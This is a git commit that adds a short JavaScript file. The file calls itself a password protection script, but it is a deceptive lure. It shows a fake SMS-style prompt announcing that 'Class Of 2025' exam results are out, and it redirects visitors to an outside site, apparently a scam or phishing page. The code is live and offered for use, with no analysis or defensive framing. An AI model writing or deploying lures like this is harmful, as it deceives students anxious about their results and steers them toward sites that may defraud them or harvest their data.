cabdc184656ea3d3a70c38835582df04553500d1
ukpeha505-rgb <ukpeha505@gmail.com>
2026-01-07 12:08:06 +0100

    Create matric-active.js

---
+++ matric-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'CHECK RESULT'
+password = prompt(
+  'SMS: Congratulations! Class Of 2025 Result is Out Press Ok to Access your Result now.',
+  'CHECK RESULT'
+);
+if (password != 'CHECK RESULT') {
+  location.href = 'https://fliout.org/matric.html';
+}
